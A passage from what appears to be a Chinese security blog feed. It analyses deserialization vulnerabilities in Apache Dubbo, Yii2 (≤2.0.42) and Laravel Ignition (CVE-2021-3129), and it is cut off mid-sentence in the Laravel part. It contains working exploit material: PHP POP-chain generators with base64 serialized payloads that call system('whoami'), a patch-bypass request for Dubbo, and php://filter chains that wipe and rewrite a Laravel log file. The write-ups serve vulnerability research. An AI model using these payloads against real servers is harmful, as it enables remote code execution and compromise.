对我们传入的类调用了Arrays.toString()方法    &#125;</code></pre><p>来到了<code>ToStringBean</code>类的Gadget</p><pre><code class="java">public class ToStringBean implements Serializable &#123;    private String toString(String prefix) &#123;        StringBuffer sb = new StringBuffer(128);        try &#123;            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(this.beanClass);            Iterator var10 = propertyDescriptors.iterator();            while(var10.hasNext()) &#123;                PropertyDescriptor propertyDescriptor = (PropertyDescriptor)var10.next();                String propertyName = propertyDescriptor.getName();                Method getter = propertyDescriptor.getReadMethod();                Object value = getter.invoke(this.obj, NO_PARAMS); // 调用相应类的get()方法                this.printProperty(sb, prefix + &quot;.&quot; + propertyName, value);            &#125;        &#125; catch (Exception var9) &#123;            LOG.error(&quot;Error while generating toString&quot;, var9);            Class&lt;? extends Object&gt; clazz = this.obj.getClass();            String errorMessage = var9.getMessage();            sb.append(String.format(&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;, clazz, errorMessage));        &#125;</code></pre><p>只要我们的<code>JdbcRowSetImpl</code>类设置了<code>databaseMetaData</code>属性就会调其<code>get()</code>方法，也就能触发其<code>lookup()</code>函数触发JNDI注入</p><pre><code class="java">public class JdbcRowSetImpl extends BaseRowSet implements JdbcRowSet, Joinable &#123;    public DatabaseMetaData getDatabaseMetaData() throws SQLException &#123;        Connection var1 = this.connect(); // 跟进connect()        return var1.getMetaData();    &#125;    private Connection connect() throws SQLException &#123;        if (this.conn != null) &#123;            return this.conn;        &#125; else if (this.getDataSourceName() != null) &#123;            try &#123;                InitialContext var1 = new InitialContext();                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); // 触发JNDI注入                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();            &#125; catch (NamingException var3) &#123;                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());            &#125;        &#125; else &#123;            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;        &#125;    &#125;</code></pre><h4 id="Java版本"><a href="#Java版本" class="headerlink" title="Java版本"></a>Java版本</h4><p><strong>漏洞利用</strong></p><p>IDEA导入marshalsec</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20210605150037087.png" alt="image-20210605150037087" style="zoom:67%;" /><p>修改<code>DemoService.java</code>，添加接口</p><pre><code class="java">String commonTest(Object o);</code></pre><p>修改<code>DefaultDemoService.java</code>，实现接口</p><pre><code class="java">@Overridepublic String commonTest(Object o) &#123;    return &quot;pwned&quot;;&#125;</code></pre><p>修改<code>DubboAutoConfigurationConsumerBootstrap.java</code>，修改runner运行<code>commonTest()</code>方法</p><p><strong>漏洞分析</strong></p><p>漏洞链如下</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106060011ed6ac1e20048a0fd8c2a.png" alt="image-20210606001138974" style="zoom:80%;" /><p>入口点也在<code>DecodeHandler</code>类的<code>received</code>方法</p><pre><code class="java">public class DecodeHandler extends AbstractChannelHandlerDelegate &#123;    public void received(Channel channel, Object message) throws RemotingException &#123;        if (message instanceof Decodeable) &#123;            this.decode(message);        &#125;        if (message instanceof Request) &#123;            this.decode(((Request)message).getData()); // 跟进decode()        &#125;        if (message instanceof Response) &#123;            this.decode(((Response)message).getResult());        &#125;        this.handler.received(channel, message);    &#125;    private void decode(Object message) &#123;        if (message instanceof Decodeable) &#123;            try &#123;                ((Decodeable)message).decode(); // 跟进Decodeable的decode()                if (log.isDebugEnabled()) &#123;                    log.debug(&quot;Decode decodeable message &quot; + message.getClass().getName());                &#125;            &#125; catch (Throwable var3) &#123;                if (log.isWarnEnabled()) &#123;                    log.warn(&quot;Call Decodeable.decode failed: &quot; + var3.getMessage(), var3);                &#125;            &#125;        &#125;    &#125;</code></pre><pre><code class="java">public class DecodeableRpcInvocation extends RpcInvocation implements Codec, Decodeable &#123;    public void decode() throws Exception &#123;        if (!this.hasDecoded &amp;&amp; this.channel != null &amp;&amp; this.inputStream != null) &#123;            try &#123;                this.decode(this.channel, this.inputStream); // 跟进decode()            &#125; catch (Throwable var5) &#123;                if (log.isWarnEnabled()) &#123;                    log.warn(&quot;Decode rpc invocation failed: &quot; + var5.getMessage(), var5);                &#125;                this.request.setBroken(true);                this.request.setData(var5);            &#125; finally &#123;                this.hasDecoded = true;            &#125;        &#125;    &#125;    public Object decode(Channel channel, InputStream input) throws IOException &#123;        ...        args = new Object[pts.length];        for(int i = 0; i &lt; args.length; ++i) &#123;            try &#123;                args[i] = in.readObject(pts[i]); // 进入反序列化            &#125; catch (Exception var17) &#123;                if (log.isWarnEnabled()) &#123;                    log.warn(&quot;Decode argument failed: &quot; + var17.getMessage(), var17);                &#125;            &#125;        &#125;        ...</code></pre><p>一路<code>readObject()</code>会来到下面的<code>readMap()</code>方法</p><pre><code class="java">public class Hessian2Input extends AbstractHessianInput implements Hessian2Constants &#123;    public Object readObject(List&lt;Class&lt;?&gt;&gt; expectedTypes) throws IOException &#123;        ...        case 72:            boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.size() == 2;            reader = this.findSerializerFactory().getDeserializer(Map.class);            return reader.readMap(this, keyValuePair ? (Class)expectedTypes.get(0) : null, keyValuePair ? (Class)expectedTypes.get(1) : null); // 进入readMap()方法        ...</code></pre><pre><code class="java">public class MapDeserializer extends AbstractMapDeserializer &#123;    public Object readMap(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType) throws IOException &#123;        Object map;        if (this._type == null) &#123;            map = new HashMap();        &#125; else if (this._type.equals(Map.class)) &#123;            map = new HashMap();        &#125; else if (this._type.equals(SortedMap.class)) &#123;            map = new TreeMap();        &#125; else &#123;            try &#123;                map = (Map)this._ctor.newInstance();            &#125; catch (Exception var6) &#123;                throw new IOExceptionWrapper(var6);            &#125;        &#125;        in.addRef(map);        this.doReadMap(in, (Map)map, expectKeyType, expectValueType); // 跟进doReadMap()        in.readEnd();        return map;    &#125;    protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123;        Deserializer keyDeserializer = null;        Deserializer valueDeserializer = null;        SerializerFactory factory = this.findSerializerFactory(in);        if (keyType != null) &#123;            keyDeserializer = factory.getDeserializer(keyType.getName());        &#125;        if (valueType != null) &#123;            valueDeserializer = factory.getDeserializer(valueType.getName());        &#125;        while(!in.isEnd()) &#123;            map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject()); // 进行反序列化两次        &#125;    &#125;</code></pre><p>因为我们的hashMap类在反序列化时会调用hashCode()方法进行赋值</p><pre><code class="java">public class EqualsBean implements Serializable &#123;    public int hashCode() &#123;        return this.beanHashCode(); // 跟进beanHashCode()    &#125;    public int beanHashCode() &#123;        return this.obj.toString().hashCode(); // 跟进toString()    &#125;    public String toString() &#123;        ...        result = this.toString(prefix); // 跟进toString()        if (needStackCleanup) &#123;            PREFIX_TL.remove();        &#125;        return result;    &#125;    private String toString(String prefix) &#123;        StringBuffer sb = new StringBuffer(128);        try &#123;            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(this.beanClass);            Iterator var10 = propertyDescriptors.iterator();            while(var10.hasNext()) &#123;                PropertyDescriptor propertyDescriptor = (PropertyDescriptor)var10.next();                String propertyName = propertyDescriptor.getName();                Method getter = propertyDescriptor.getReadMethod();                Object value = getter.invoke(this.obj, NO_PARAMS); // 调用了get()方法，后面的步骤和上面一样                this.printProperty(sb, prefix + &quot;.&quot; + propertyName, value);            &#125;        &#125; catch (Exception var9) &#123;            LOG.error(&quot;Error while generating toString&quot;, var9);            Class&lt;? extends Object&gt; clazz = this.obj.getClass();            String errorMessage = var9.getMessage();            sb.append(String.format(&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;, clazz, errorMessage));        &#125;        return sb.toString();    &#125;</code></pre><p><strong>patch1</strong></p><blockquote><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0R133">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0R133</a></p></blockquote><p>在<code>DecodeableRpcInvocation</code>类中增加对参数的判断，用<code>String.equals()</code>方法对比了<code>method</code>参数是否和<code>INVOKE_ASYNC</code>常量的值是否相同</p><p><strong>patch绕过</strong></p><p>在if条件中，<code>method</code>参数会进入<code>isEcho()</code>函数，用<code>String.equals()</code>方法对比了<code>$ECHO</code>常量的值和<code>method</code>参数是否相同</p><pre><code class="java">public class DecodeableRpcInvocation extends RpcInvocation implements Codec, Decodeable &#123;    ...    if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;        if (!RpcUtils.isGenericCall(path, getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, getMethodName())) &#123; // 新增判断            throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + getMethodName());        &#125;        pts = ReflectUtils.desc2classArray(desc);    &#125;    ...public class RpcUtils &#123;    ...    public static boolean isGenericCall(String path, String method) &#123;        return $INVOKE.equals(method) || $INVOKE_ASYNC.equals(method); // String $INVOKE = &quot;$invoke&quot;; String $INVOKE_ASYNC = &quot;$invokeAsync&quot;;    &#125;    public static boolen isEcho(String path, String method) &#123;        return $ECHO.equals(method); // String $ECHO = &quot;$echo&quot;;     &#125;    ...</code></pre><p>所以只要让method的值等于<code>&quot;$invoke&quot;</code>，<code>&quot;$invokeAsync&quot;</code>，<code>&quot;$echo&quot;</code>任意一个即可绕过</p><pre><code class="java">resp = client.send_request_and_return_response(    service_name=&#39;com.example.provider.service.UesrService&#39;,    method_name=&#39;$invoke&#39;,    args=[toStringBean])</code></pre><p><strong>patch2</strong></p><blockquote><p><a href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40">https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40</a></p></blockquote><p>最后又验证了<code>parameterTypesDesc</code>的类型</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/197658">dubbo源码浅析：默认反序列化利用之hessian2</a></p><p><a href="https://xz.aliyun.com/t/7354">Dubbo反序列化RCE利用之新拓展面 - Dubbo Rouge攻击客户端</a></p><p><a href="https://f5.pm/go-28632.html">Apache Dubbo 2.7.6 反序列化漏洞复现及分析</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yii2最新反序列化POP链分析</title>
      <link href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Yii2 &lt;= 2.0.42</p><p>研究Yii2最新的反序列化RCE，并参考作者思路挖掘新的Gadget</p></blockquote><span id="more"></span><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><pre><code class="cmd">composer create-project --prefer-dist yiisoft/yii2-app-basic yii2</code></pre><p>把目录放到网站下，访问<code>http://127.0.0.1/yii2/web</code>即可</p><p>然后在<code>controllers/SiteController.php</code>文件下添加我们的测试路由：</p><pre><code class="php">public function actionTest()&#123;    return unserialize(base64_decode($_GET[&quot;data&quot;]));&#125;</code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="php">&lt;?phpnamespace Faker;class DefaultGenerator&#123;    protected $default ;    function __construct($argv)    &#123;        $this-&gt;default = $argv;    &#125;&#125;class ValidGenerator&#123;    protected $generator;    protected $validator;    protected $maxRetries;    function __construct($command,$argv)    &#123;        $this-&gt;generator = new DefaultGenerator($argv);        $this-&gt;validator = $command;        $this-&gt;maxRetries = 99999999;    &#125;&#125;namespace Codeception\Extension;use Faker\ValidGenerator;class RunProcess&#123;    private $processes = [];    function __construct($command,$argv)    &#123;        $this-&gt;processes[] = new ValidGenerator($command,$argv);    &#125;&#125;$exp = new RunProcess(&#39;system&#39;,&#39;whoami&#39;);echo(base64_encode(serialize($exp)));# TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEyOiIAKgBnZW5lcmF0b3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6Njoid2hvYW1pIjt9czoxMjoiACoAdmFsaWRhdG9yIjtzOjY6InN5c3RlbSI7czoxMzoiACoAbWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</code></pre><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png" alt="image-20210603224742097" style="zoom:67%;" /><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>入口点在<code>vendor/codeception/codeception/ext/RunProcess.php</code>的<code>__destruct</code>方法中，这个方法很早就有人用了，但是官方还没禁止其反序列化</p><pre><code class="php">class RunProcess extends Extension&#123;    public function __destruct()    &#123;        $this-&gt;stopProcess(); // 漏洞入口    &#125;    public function stopProcess()    &#123;        foreach (array_reverse($this-&gt;processes) as $process) &#123;            /** @var $process Process  **/            if (!$process-&gt;isRunning()) &#123; // 不存在isRunning()方法，调用__call()方法                continue;            &#125;            $this-&gt;output-&gt;debug(&#39;[RunProcess] Stopping &#39; . $process-&gt;getCommandLine());            $process-&gt;stop();        &#125;        $this-&gt;processes = [];    &#125;</code></pre><p>触发<code>vendor/fakerphp/faker/src/Faker/ValidGenerator.php</code>的<code>__call()</code>方法</p><pre><code class="php">class ValidGenerator&#123;    public function __call($name, $arguments)    &#123;        $i = 0;        do &#123;            $res = call_user_func_array([$this-&gt;generator, $name], $arguments); // $name为isRunning，$arguments为空，我们可以通过另一个类的__call()函数返回指定值            ++$i;            if ($i &gt; $this-&gt;maxRetries) &#123;                throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));            &#125;        &#125; while (!call_user_func($this-&gt;validator, $res)); // 命令执行        return $res;    &#125;</code></pre><p>上面的<code>call_user_func_array()</code>方法可以利用<code>vendor/fakerphp/faker/src/Faker/DefaultGenerator.php</code>中的<code>__call()</code>方法返回自定义值</p><pre><code class="php">class DefaultGenerator&#123;    public function __call($method, $attributes)    &#123;        return $this-&gt;default; // 传入需要执行的命令    &#125;</code></pre><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>Yii2的补丁大都是直接加一个<code>__wakeup()</code>方法抛出错误禁止反序列化，即黑名单过滤</p><p>跟着作者的思路，全局搜一下<code>__destruct()</code>方法，能用的基本就只剩下上面那个<code>RunProcess</code>类了</p><p>只能去搜一下<code>__call()</code>方法，然后发现了下面的<code>UniqueGenerator</code>类，和上面用到的<code>ValidGenerator</code>类很相似</p><pre><code class="php">namespace Faker;class UniqueGenerator&#123;    public function __call($name, $arguments)    &#123;        if (!isset($this-&gt;uniques[$name])) &#123;            $this-&gt;uniques[$name] = [];        &#125;        $i = 0;        do &#123;            $res = call_user_func_array([$this-&gt;generator, $name], $arguments); // $res可控            ++$i;            if ($i &gt; $this-&gt;maxRetries) &#123;                throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a unique value&#39;, $this-&gt;maxRetries));            &#125;        &#125; while (array_key_exists(serialize($res), $this-&gt;uniques[$name])); // 调用了serialize()方法，可以触发__sleep()方法        $this-&gt;uniques[$name][serialize($res)] = null;        return $res;    &#125;</code></pre><p>搜索<code>__sleep()</code>方法，来到了熟悉的<code>LazyString</code>类，到这里的思路应该就是全局搜一下<code>call_user_func()</code>方法，看看有没有可控的触发函数，这里我们就直接使用去年就已经被挖出来的<code>LazyString Gadget</code>吧</p><pre><code class="php">namespace Symfony\Component\String;class LazyString implements \Stringable, \JsonSerializable&#123;    public function __sleep(): array    &#123;        $this-&gt;__toString(); // 调用__toString()        return [&#39;value&#39;];    &#125;    public function __toString()    &#123;        if (\is_string($this-&gt;value)) &#123;            return $this-&gt;value;        &#125;        try &#123;            return $this-&gt;value = ($this-&gt;value)(); // 函数可控        &#125; catch (\Throwable $e) &#123;            if (\TypeError::class === \get_class($e) &amp;&amp; __FILE__ === $e-&gt;getFile()) &#123;                $type = explode(&#39;, &#39;, $e-&gt;getMessage());                $type = substr(array_pop($type), 0, -\strlen(&#39; returned&#39;));                $r = new \ReflectionFunction($this-&gt;value);                $callback = $r-&gt;getStaticVariables()[&#39;callback&#39;];                $e = new \TypeError(sprintf(&#39;Return value of %s() passed to %s::fromCallable() must be of the type string, %s returned.&#39;, $callback, static::class, $type));            &#125;            if (\PHP_VERSION_ID &lt; 70400) &#123;                // leverage the ErrorHandler component with graceful fallback when it&#39;s not available                return trigger_error($e, \E_USER_ERROR);            &#125;            throw $e;        &#125;    &#125;</code></pre><p>给出最后的exp</p><pre><code class="php">&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        function __construct()        &#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;whoami&#39;;        &#125;    &#125;&#125;namespace Symfony\Component\String&#123;    use yii\rest\IndexAction;    class LazyString    &#123;        function __construct()        &#123;            $this-&gt;value = [new indexAction(), &quot;run&quot;];        &#125;    &#125;     class UnicodeString    &#123;        function __construct()        &#123;            $this-&gt;value = new LazyString();        &#125;    &#125;&#125;namespace Faker&#123;    use Symfony\Component\String\LazyString;    class DefaultGenerator    &#123;        function __construct()        &#123;            $this-&gt;default = new LazyString();        &#125;    &#125;    class UniqueGenerator    &#123;        function __construct()        &#123;            $this-&gt;generator = new DefaultGenerator();            $this-&gt;maxRetries = 99999999;        &#125;    &#125;&#125;namespace Codeception\Extension&#123;    use Faker\UniqueGenerator;    class RunProcess    &#123;        function __construct()        &#123;            $this-&gt;processes[] = new UniqueGenerator();        &#125;    &#125;&#125;namespace&#123;    use Codeception\Extension\RunProcess;    $exp = new RunProcess();    echo(base64_encode(serialize($exp)));&#125;# TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6OToicHJvY2Vzc2VzIjthOjE6e2k6MDtPOjIxOiJGYWtlclxVbmlxdWVHZW5lcmF0b3IiOjI6e3M6OToiZ2VuZXJhdG9yIjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjc6ImRlZmF1bHQiO086MzU6IlN5bWZvbnlcQ29tcG9uZW50XFN0cmluZ1xMYXp5U3RyaW5nIjoxOntzOjU6InZhbHVlIjthOjI6e2k6MDtPOjIwOiJ5aWlccmVzdFxJbmRleEFjdGlvbiI6Mjp7czoyOiJpZCI7czo2OiJ3aG9hbWkiO3M6MTE6ImNoZWNrQWNjZXNzIjtzOjY6InN5c3RlbSI7fWk6MTtzOjM6InJ1biI7fX19czoxMDoibWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</code></pre><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106040200d261d2fda84de853a1e7.png" alt="image-20210604020055359" style="zoom:67%;" /><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/9420">Yii2反序列化RCE 新POP链</a></p><p><a href="https://www.anquanke.com/post/id/217929">Yii反序列化分析</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Debug mode RCE复现</title>
      <link href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CVE-2021-3129</p><p>Laravel &lt;= 8.4.2</p><p>Ignition &lt;= 2.5.1</p></blockquote><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>在kali2020下复现</p></blockquote><pre><code class="cmd">git clone https://github.com/laravel/laravel.git    # 下载laravel源码cd laravel                                            # 切换到laravel目录git checkout -b e849812                              # 切换到存在漏洞的分支composer update                                        # 更新composercomposer install                                       # composer安装依赖composer require facade/ignition==2.5.1                # 下载存在漏洞版本组件mv .env.example .env                                # 更改.env文件php artisan key:generate                             # 生成Application keyphp artisan serve                                    # 启动服务器</code></pre><p> 创建<code>resource/views/hello.blade.php</code>模板</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;h1&gt;hello, &#123;&#123; $username &#125;&#125;&lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p> 在<code>routes/web.php</code>中添加路由</p><pre><code class="php">Route::get(&#39;/hello&#39;, function () &#123;    return view(&#39;hello&#39;);&#125;);</code></pre><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>在修正未定义变量时存在一处<code>file_get_contents()</code>和一处<code>file_put_contents()</code>函数的第一参数可控，且在laravel中我们可以往log文件插入部分可控内容，且我们对log文件具有可写权限，导致我们可以通过把log文件覆写为phar文件，再通过phar反序列化实现命令执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用栈分析"><a href="#调用栈分析" class="headerlink" title="调用栈分析"></a>调用栈分析</h3><p>访问新添加的路由<code>/laravel/public/hello</code>会抛出变量名未定义的错误，出现了一个按钮并提示按样例修改模板</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281210fa90afa0a5cfb6e9438b.png" alt="image-20210525133932073" style="zoom: 67%;" /><p>点击<code>Make variable optional</code>按钮并抓包，发生漏洞的接口就是在<code>/laravel/public/_ignition/execute-solution</code>这里，可以看到这里传入了<code>viewFile</code>参数对文件进行操作</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281211e62811b5bb60e97317a9.png" alt="image-20210525141459623"></p><p>通过在源码搜索<code>execute-solution</code>可以搜索到Web接口，可以看到<code>ExecuteSolutionController</code>类对象被当成函数调用，所以最终会触发其<code>__invoke()</code>函数</p><pre><code class="php">namespace Facade\Ignition;class IgnitionServiceProvider extends ServiceProvider&#123;    Route::post(&#39;execute-solution&#39;, ExecuteSolutionController::class) // 调用__invoke()函数        -&gt;middleware(IgnitionConfigValueEnabled::class.&#39;:enableRunnableSolutions&#39;)        -&gt;name(&#39;executeSolution&#39;);</code></pre><p>我们跟进一下它的<code>__invoke()</code>函数，第一步是初始化变量，第二部就是处理参数</p><pre><code class="php">namespace Facade\Ignition\Http\Controllers;class ExecuteSolutionController&#123;    public function __invoke(        ExecuteSolutionRequest $request,        SolutionProviderRepository $solutionProviderRepository    ) &#123;        $solution = $request-&gt;getRunnableSolution();        $solution-&gt;run($request-&gt;get(&#39;parameters&#39;, [])); // 跟进参数处理函数        return response(&#39;&#39;);    &#125;&#125;</code></pre><p>根据<code>run()</code>函数，我们看到了<code>file_put_contents()</code>函数的第一个参数可控，我们还得跟进一下<code>makeOptional()</code>函数</p><pre><code class="php">namespace Facade\Ignition\Solutions;class MakeViewVariableOptionalSolution implements RunnableSolution&#123;    public function run(array $parameters = [])    &#123;        $output = $this-&gt;makeOptional($parameters);        if ($output !== false) &#123;            file_put_contents($parameters[&#39;viewFile&#39;], $output); // file_put_contents()的第一参数可控        &#125;    &#125;</code></pre><p>在这里我们又看到了<code>file_get_contents()</code>函数第一个参数可控，后面就是修正操作，即为模板中的未定义变量添加一个判断条件</p><pre><code class="php">namespace Facade\Ignition\Solutions;class MakeViewVariableOptionalSolution implements RunnableSolution&#123;    public function makeOptional(array $parameters = [])    &#123;        $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]); // file_get_contents()的第一参数可控        $newContents = str_replace(&#39;$&#39;.$parameters[&#39;variableName&#39;], &#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;, $originalContents);        $originalTokens = token_get_all(Blade::compileString($originalContents));        $newTokens = token_get_all(Blade::compileString($newContents));        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#39;variableName&#39;]);        if ($expectedTokens !== $newTokens) &#123;            return false;        &#125;        return $newContents;    &#125;</code></pre><p>所以我们可以把上面的代码浓缩为下面两行，简称先读后写</p><blockquote><p>应该有好些不知名CMS都有这么写过</p></blockquote><pre><code class="php">$output = file_get_contents($parameters[&#39;viewFile&#39;]);file_put_contents($parameters[&#39;viewFile&#39;], $output);</code></pre><h3 id="日志部分可控"><a href="#日志部分可控" class="headerlink" title="日志部分可控"></a>日志部分可控</h3><p>另外，我们可以对laravel的日志文件插入部分可控内容，默认目录是<code>storage/logs/laravel.log</code></p><p>比如当我们传入</p><pre><code class="php">viewFile: This is the controlled part</code></pre><p>我们可以发现<code>laravel.log</code>文件中出现了报错信息，其中有两处<code>This is the controlled part</code>字段，同时还有一处带省略号的（提前警告这是个坑）</p><pre><code>[2021-05-27 13:08:30] local.ERROR: file_get_contents(This is the controlled part): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(This is the controlled part): failed to open stream: No such file or directory at xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php:75)[stacktrace]#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;xxxxxx...&#39;, 75, Array)#1 xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php(75): file_get_contents(&#39;This is control...&#39;)</code></pre><p>它的大体结构如下面所示</p><pre><code>[label1] payload [label2] payload [label3]</code></pre><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><blockquote><p>官方文档：<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p></blockquote><p>所以我们的核心问题变成了如何向log文件写入一个合法的phar文件，这里我们需要利用到强大的<code>php://filter</code>，我们可以利用特别的编码和解码方法来对我们插入的内容进行修改</p><p><strong>清空文件</strong></p><p>第一个思路是我们可以用base64在解码时会自动丢弃无效字符的方法进行清空，所以按理来说只要我们多次对内容进行base64解码，那么最终就会把所有字符丢弃</p><pre><code>php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p>但是如果文本当中出现<code>&#39;=&#39;</code>字符，<code>base64-decode</code>会抛出错误导致写入失败</p><p>所以<strong>@CHARLES FOL</strong>使用到的是php内置的官方文档未提及的<code>consumed</code>过滤器，可以直接返回空</p><pre><code>php://filter/read=consumed/resource=../storage/logs/laravel.log</code></pre><p>自己尝试了一下如果服务器的php支持<code>zlib</code>或者<code>bzip2</code>的话，也可以利用解压失败返回空的性质进行清空</p><pre><code>php://filter/read=zlib.inflate/resource=../storage/logs/laravel.logphp://filter/read=bzip2.decompress/resource=../storage/logs/laravel.log</code></pre><p><strong>写入payload</strong></p><p>在<code>php://filter</code>中有一个很好用的转换过滤器<code>iconv.utf16le.utf-8</code>，它能够把<code>UTF-16</code>字符转化为<code>UTF-8</code>字符，样例如下：</p><pre><code class="shell">echo -ne &#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]&#39; &gt; /tmp/test.txt</code></pre><pre><code class="shell">php -r &quot;echo file_get_contents(&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;);&quot;# 卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠</code></pre><p>既可以传入我们完整的payload，又可以让其他正常字符转为无效字符，之后我们直接base64-decode即可写入payload</p><p>为了只留下一个payload字段，我们可以在payload的末尾添加一个byte的字符进行干扰即可，如：</p><pre><code class="shell">echo -ne &#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]&#39; &gt; /tmp/test.txt</code></pre><pre><code class="shell">php -r &quot;echo file_get_contents(&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;);&quot;# 卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠</code></pre><p>相应的限制条件是：</p><ol><li>保证第一个payload字段前面的字符串长度是<code>2*n bytes</code>，不然无法解码出payload</li><li>保证整个字符串的总体长度是<code>2*n bytes</code>，不然会抛出以下错误<code>file_get_contents(): iconv stream filter 